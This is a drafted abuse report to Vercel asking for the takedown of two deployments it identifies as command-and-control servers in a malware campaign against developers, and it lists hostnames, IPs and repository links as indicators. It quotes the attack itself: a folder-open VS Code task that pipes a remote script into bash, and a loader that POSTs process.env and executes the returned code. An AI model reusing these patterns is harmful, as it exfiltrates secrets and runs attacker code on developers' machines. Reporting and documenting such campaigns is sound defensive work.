# Abuse report — Vercel

**Submission target:** https://vercel.com/help — search "Report abuse" or use https://vercel.com/security/abuse if available; otherwise file a support ticket categorized as "abuse / DMCA / legal."
**Report submitter:** (fill in your name / handle)
**Date:** 2026-05-13

---

## Subject

Two Vercel deployments are operating as command-and-control servers in an active developer-targeting malware campaign

---

## Body (paste into the ticket)

Two Vercel `*.vercel.app` deployments are operating as C2 servers in an active, currently-live developer-targeting malware campaign. Both deployments are referenced from malicious GitHub repositories that are themselves under abuse-report to GitHub Trust & Safety.

**Hostnames and IPs:**

| Hostname | A records | Role |
|---|---|---|
| `vscode-settings-0506.vercel.app` | `64.29.17.195`, `216.198.79.195` | Per-OS shell-payload distribution. Three endpoints under `/api/settings/{mac,linux,windows}` serve OS-specific shell scripts to victims via piped `curl|bash` / `wget|sh` / `curl|cmd` |
| `ip-core-api-one.vercel.app`     | `64.29.17.131`, `216.198.79.131` | Node-loader C2: receives a victim's full `process.env` via HTTPS POST and returns JavaScript that the victim's Node process executes via `new Function("require", response.data)(require)` |

The two hosts resolve to **adjacent last-octets in Vercel's edge** (`{64.29.17,216.198.79}.{131,195}`) — same operator, same deployment slice, almost certainly the same Vercel account.

**Evidence of malicious use.** The C2 hostnames are referenced directly from malicious GitHub repositories. The hostname `vscode-settings-0506.vercel.app` is referenced in a `.vscode/tasks.json` task configured to `runOn: "folderOpen"`, executing `curl -L 'https://vscode-settings-0506.vercel.app/api/settings/mac' | bash` (and equivalents for Linux and Windows) with all output suppressed. The hostname `ip-core-api-one.vercel.app` is referenced from `.env` as `AUTH_API=aHR0cHM6Ly9pcC1jb3JlLWFwaS1vbmUudmVyY2VsLmFwcC9hcGk=` (base64 for `https://ip-core-api-one.vercel.app/api`), then loaded by `server/routes/api/auth.js`, which POSTs `{ ...process.env }` to that URL and `new Function`-executes the response.

Source repository (one of ~15 in the campaign): `https://github.com/AjunaWorkHub/AjunaVerse_MVP`. File permalinks:

- `.vscode/tasks.json` (refs `vscode-settings-0506.vercel.app`): https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/.vscode/tasks.json
- `.env` (refs `ip-core-api-one.vercel.app` as base64): https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/.env
- `server/controllers/auth.js` (the POST/exec primitive): https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/server/controllers/auth.js
- `server/routes/api/auth.js` (the loader call): https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/server/routes/api/auth.js

**Evidence that the deployments are operating as gated C2 (not benign apps).** When probed from a non-target IP, both hostnames return:

```
HTTP/2 403 Forbidden
x-deny-reason: host_not_allowed
content-length: 21
content-type: text/plain

Host not in allowlist
```

This identical custom denial is returned from every path probed on both hosts (`/`, `/favicon.ico`, `/robots.txt`, `/api/health`, `/admin`, `/healthz`, `/api/settings/linux`, etc.) and is unaffected by `Host:` / `Referer:` / `Origin:` header spoofing — the gate is on the **client IP**, not the HTTP Host header. Target-IP-allowlist gating is consistent with developer-targeting C2 in which the operator manually registers each victim's IP before the interview; it is not consistent with any benign Vercel application.

**Reproducible probe** (returns 403 from any non-target IP):

```
$ curl -sS -I -A 'curl/8.7.1' https://vscode-settings-0506.vercel.app/api/settings/mac
HTTP/2 403
x-deny-reason: host_not_allowed
content-length: 21
content-type: text/plain
```

**Requested actions.**

1. Take down both deployments: `vscode-settings-0506.vercel.app` and `ip-core-api-one.vercel.app`.
2. Identify and suspend the Vercel account hosting them. Given the adjacent IP pairs, both deployments are very likely on the same account.
3. Search for sibling deployments under naming patterns `vscode-settings-*.vercel.app` and `ip-core-api-*.vercel.app` from the same account (the `-0506` suffix is plausibly date-encoded, suggesting prior deployments at other dates; the `-one` suffix suggests `-two`, `-three`, etc.).
4. Preserve account / deployment / access-log records as forensic evidence prior to takedown — this would substantially help law-enforcement follow-up if pursued.

---

## Supporting artifacts

- Full technical analysis: [`README.md`](./README.md)
- IOCs in machine-readable form: [`iocs.csv`](./iocs.csv), [`iocs.json`](./iocs.json)
- Companion abuse report to GitHub T&S: [`abuse-report-github.md`](./abuse-report-github.md)
